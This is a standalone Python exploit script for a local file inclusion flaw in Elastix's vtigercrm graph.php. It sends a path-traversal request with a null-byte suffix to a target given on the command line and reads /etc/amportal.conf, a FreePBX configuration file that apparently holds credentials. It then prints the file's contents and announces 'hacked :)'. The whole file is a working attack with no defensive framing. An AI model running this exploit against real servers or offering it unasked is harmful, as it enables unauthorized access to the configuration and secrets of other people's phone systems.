import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

class ElastixGraphLFI:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    
    def __init__(self, rhost):
        print (LogColors.BLUE + "victim host: " + rhost + "..." + LogColors.ENDC)
        self.rhost = rhost
        self.session = requests.Session()

    def exploit(self):
        f = "/etc/amportal.conf"
        print (LogColors.BLUE + "try to read: " + f + "..." + LogColors.ENDC)
        url = "https://" + self.rhost + ":443"
        url += "/vtigercrm/graph.php?current_language="
        url += "../../../../../../../../" + f
        url += "%00&module=Accounts&action"

        r = self.session.get(url, headers = self.headers, verify = False)
        print (LogColors.YELLOW + "request: " + url + "..." + LogColors.ENDC)
        if r.ok and "This file is part of FreePBX" in r.text:
            print (LogColors.YELLOW + "file content:" + LogColors.ENDC)
            print (LogColors.YELLOW + r.text + LogColors.ENDC)
            print (LogColors.GREEN + "successful read. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed read file :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target ip/host")
    args = vars(parser.parse_args())
    host = args['target']
    cve = ElastixGraphLFI(host)
    cve.exploit()

